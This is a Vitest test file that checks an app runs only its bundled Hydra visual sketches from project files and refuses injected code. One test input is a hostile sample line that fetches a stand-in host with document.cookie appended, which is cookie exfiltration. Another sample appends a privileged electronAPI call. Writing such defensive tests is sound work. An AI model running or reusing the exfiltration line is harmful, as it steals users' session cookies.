import { describe, expect, it } from 'vitest';
import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { HYDRA_PRESETS, resolveBundledHydraSketch } from '../effects/hydraPresets';

/**
 * Hydra sketch code is compiled and run as JavaScript in an app window, and
 * a layer's code comes from the project file. The editor window uses the
 * native engine and never reaches it, but the Stage 3D, projection
 * simulator, Screen and texture-share windows still mount the legacy canvas
 * and do. The app has no sketch editor, so only the sketches it ships run.
 */


describe('Hydra sketch code from a project file', () => {
  it('runs a bundled sketch as it ships', () => {
    for (const preset of HYDRA_PRESETS) {
      expect(resolveBundledHydraSketch(preset.code, preset.name)).toBe(preset.code);
      expect(resolveBundledHydraSketch(`  ${preset.code}\n`, null)).toBe(preset.code);
    }
  });

  it('never returns code that is not bundled', () => {
    const hostile = "fetch('https://example.invalid/?' + document.cookie); osc().out()";
    expect(resolveBundledHydraSketch(hostile, 'My Sketch')).toBeNull();
    expect(resolveBundledHydraSketch(hostile, null)).toBeNull();
    // A known preset name does not vouch for the code beside it.
    const welcome = HYDRA_PRESETS.find(p => p.name === 'Welcome')!;
    expect(resolveBundledHydraSketch(hostile, 'Welcome')).toBe(welcome.code);
    expect(resolveBundledHydraSketch(`${welcome.code}; window.electronAPI.invoke('x')`, 'Nope')).toBeNull();
  });

  it('falls back to the named preset when a layer has no code', () => {
    const welcome = HYDRA_PRESETS.find(p => p.name === 'Welcome')!;
    expect(resolveBundledHydraSketch('', 'Welcome')).toBe(welcome.code);
    expect(resolveBundledHydraSketch(undefined, 'Welcome')).toBe(welcome.code);
    expect(resolveBundledHydraSketch('', 'Unknown')).toBeNull();
  });

  it('compiles only what the resolver returned', () => {
    const source = readFileSync(join(process.cwd(), 'src', 'lib', 'effects', 'hydraVisualizer.ts'), 'utf8');
    const compile = source.slice(source.indexOf('private compileSketch('), source.indexOf('private runSketch('));
    expect(compile).toContain('resolveBundledHydraSketch(code, this.params.sketchName)');
    expect(compile).toMatch(/new Function\(\.\.\.this\.synthKeys, `"use strict";\\n\$\{bundled\}`\)/);
    expect(compile).not.toContain('${code}');
    expect(source.match(/= new Function\(/g)).toHaveLength(1);
  });
});
